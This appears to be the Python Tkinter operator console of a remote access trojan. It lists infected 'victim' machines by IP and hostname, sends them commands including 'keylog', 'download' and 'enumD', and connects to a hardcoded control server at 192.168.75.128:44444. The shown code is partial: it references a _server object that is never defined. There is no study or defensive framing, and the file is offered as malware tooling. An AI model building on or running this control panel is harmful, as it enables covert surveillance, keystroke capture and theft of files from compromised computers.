import db
import Connection
from Tkinter import *
import Tkinter as tk
import socket
import struct

class Client:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    root = Tk()
    globals()['textVar'] = StringVar(root)
    frame = Frame(root, height="200", width="200")
    text = Text(frame, height=25, width=55)
    textVar = StringVar(root)
    client = StringVar(root)
    clientMenu = None
    cmd = StringVar(root)

    DB = db.DB()
    connections = DB.getAllConnectionsPrint()
    for i in range(len(connections)):
       connections[i] = str(connections[i]["uniq"]) + " - " + str(connections[i]["ip"]) + " - " + str(connections[i]["hostname"])

    commandsAvailable = ["showC", "help", "download", "enumD", "keylog", "quit"]

    @staticmethod
    def trimMessage(m):
        """
        trims the message received from victim to readable form
        :param m: string from socket.recv()
        :return:
        """
        newM = m.split('\x00')[0]
        return newM

    @staticmethod
    def redrawClientMenu():
        Client.clientMenu['menu'].delete(0, 'end')
        for i in Client.connections:
            Client.clientMenu['menu'].add_command(label=i, command=tk._setit(Client.client, i))

    @staticmethod
    def createWindow():
        Client.root.title("Client")
        Client.root.config(height=500, width=500)
        s = Scrollbar(Client.frame)
        Client.text.pack(side=LEFT, fill=Y)
        s.pack(side=RIGHT, fill=Y)
        s.config(command=Client.text.yview)
        Client.text.config(yscrollcommand=s.set)
        Client.text.config(state=DISABLED)

        Client.client.set("Select Client")
        Client.clientMenu = OptionMenu(Client.root, Client.client, "All", *Client.connections)
        Client.clientMenu.place(relx=.1, rely=.85)

        Client.cmd.set("Select Command")
        cmdMenu = OptionMenu(Client.root, Client.cmd, *Client.commandsAvailable)
        cmdMenu.place(relx=.40, rely=.85)

        Client.frame.place(relx=.1, rely=.1)

        button = Button(Client.root, text="enter", command=Client.clickEnter)
        button.place(relx=.75, rely=.852)

        st = Button(Client.root, text="Connect", command=Client.start)
        st.place(relx=.1, rely=.03)
        Client.root.protocol("WM_DELETE_WINDOW", Client.onClose)
        Client.root.mainloop()

    @staticmethod
    def onClose():
        Client.DB.REMOVEALL()
        Client.root.destroy()

    @staticmethod
    def start():
        Client.sock.connect(("192.168.75.128", 44444))
        Client.sendMsg(Client.sock, "tanton")
        Client.sendMsg(Client.sock, "-1")
        msg = Client.trimMessage(Client.sock.recv(256))
        Client.updateTextbox(msg)

    @staticmethod
    def sendMsg(s, m):
        m = struct.pack('>I', len(m)) + m
        s.sendall(m)

    @staticmethod
    def clickEnter():
        comd = Client.cmd.get()
        cli = Client.client.get().split(" - ")
        l = []
        l.append(Connection.Connection(cli[0], cli[1], cli[2], "s"))
        l.append(comd)
        l[0].socket = Client.DB.findSocketByID(l[0].unique)
        print(l[0].socket)
        Client._server.whatDo(l)

    @staticmethod
    def updateTextbox(s):
        Client.text.config(state=NORMAL)
        Client.text.insert(tk.END, s)
        Client.text.config(state=DISABLED)
        return 1

def main():
    c = Client.createWindow()

main()